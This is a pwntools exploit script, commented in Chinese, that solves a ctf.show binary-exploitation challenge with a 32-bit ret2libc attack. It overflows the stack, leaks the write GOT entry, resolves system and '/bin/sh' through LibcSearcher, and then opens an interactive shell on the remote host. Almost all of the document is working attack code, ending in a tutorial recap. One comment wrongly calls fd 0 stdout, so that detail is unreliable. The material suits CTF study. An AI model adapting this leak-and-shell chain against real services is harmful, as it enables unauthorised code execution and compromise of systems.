from pwn import *
from LibcSearcher3 import *

context.log_level = 'debug'

p = remote('pwn.challenge.ctf.show', 28197)
elf = ELF('../code/pwn')

# offset = 0x6B + 4：计算32位程序的栈溢出偏移量
# 0x6B：缓冲区到saved ebp的距离（通过IDA或cyclic计算）
# 4：saved ebp的大小（32位程序）
# 总偏移量 = 0x6B + 4 = 0x6F，定位到返回地址
offset = 0x6B + 4

# write_plt = elf.plt['write']：write函数的PLT表地址
# PLT（Procedure Linkage Table）是动态链接的跳表，用于调用动态链接函数
write_plt = elf.plt['write']

# write_got = elf.got['write']：write函数的GOT表地址
# GOT（Global Offset Table）存储了动态链接函数的实际地址
# 通过打印GOT表中的值，可以泄露函数的真实地址
write_got = elf.got['write']

# main_addr = elf.sym['main']：main函数的地址
# 用于write函数执行完后返回到main，以便进行第二次输入
main_addr = elf.sym['main']

# payload构造分析（第一次泄露）：
# b'a' * offset：填充垃圾数据到返回地址位置
# p32(write_plt)：覆盖返回地址为write函数的PLT地址
# p32(main_addr)：write函数的返回地址，执行完write后回到main
# p32(0)：write函数的第一个参数（fd=0，stdout）
# p32(write_got)：write函数的第二个参数（要打印的地址，即GOT表中write的位置）
# p32(0x10)：write函数的第三个参数（打印长度，16字节）
# 32位调用约定：参数通过栈传递，从右到左入栈
payload = b'a' * offset + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x10)

p.sendlineafter('O.o?\n', payload)  # 等待提示后发送payload

# write_addr = u32(p.recvuntil(b'\xf7'))：接收并解析泄露的write函数地址
# u32()：将4字节数据转换为32位无符号整数
# 由于libc地址通常以0xf7开头，使用recvuntil(b'\xf7')来截取地址
write_addr = u32(p.recvuntil(b'\xf7'))

# libc = LibcSearcher('write', write_addr)：使用LibcSearcher根据write地址查找libc版本
# LibcSearcher会根据泄露的函数地址匹配可能的libc版本
libc = LibcSearcher('write', write_addr)

# libcbase = write_addr - libc.dump('write')：计算libc基址
# libc.dump('write')：获取write函数在libc中的偏移量
# 实际地址 = 基址 + 偏移量，所以基址 = 实际地址 - 偏移量
libcbase = write_addr - libc.dump('write')

# sys_addr = libcbase + libc.dump('system')：计算system函数的实际地址
# libc.dump('system')：获取system函数在libc中的偏移量
sys_addr = libcbase + libc.dump('system')

# bin_sh_addr = libcbase + libc.dump('str_bin_sh')：计算/bin/sh字符串的实际地址
# libc.dump('str_bin_sh')：获取/bin/sh字符串在libc中的偏移量
bin_sh_addr = libcbase + libc.dump('str_bin_sh')

# payload2构造分析（第二次利用）：
# b'a' * offset：填充垃圾数据到返回地址位置
# p32(sys_addr)：覆盖返回地址为system函数的实际地址
# p32(main_addr)：system函数的返回地址（可以填任意值）
# p32(bin_sh_addr)：system函数的参数，即/bin/sh字符串的地址
payload2 = b'a' * offset + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)

p.sendline(payload2)  # 发送第二次payload，执行system("/bin/sh")

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 32位动态链接程序
2. 核心概念：
   - 程序没有system函数和/bin/sh字符串
   - 需要泄露libc地址，计算system和/bin/sh的实际地址
3. 泄露原理：
   - GOT表存储了动态链接函数的实际地址
   - 调用write(0, write_got, 0x10)可以打印write函数的真实地址
4. payload结构（第一次）：
   b'a' * offset     - 填充
   + p32(write_plt)  - 调用write
   + p32(main_addr)  - write返回后回到main，可以再次输入
   + p32(0)          - write第一个参数（fd=0，stdout）
   + p32(write_got)  - write第二个参数（要打印的地址）
   + p32(0x10)       - write第三个参数（打印长度）
5. LibcSearcher使用：
   - 根据泄露的write地址，识别libc版本
   - 计算libc基址：libcbase = write_addr - write_offset
   - 计算其他函数地址：sys_addr = libcbase + system_offset
6. payload结构（第二次）：
   填充 + system + main + bin_sh
7. 关键点：两次输入，第一次泄露，第二次利用
"""
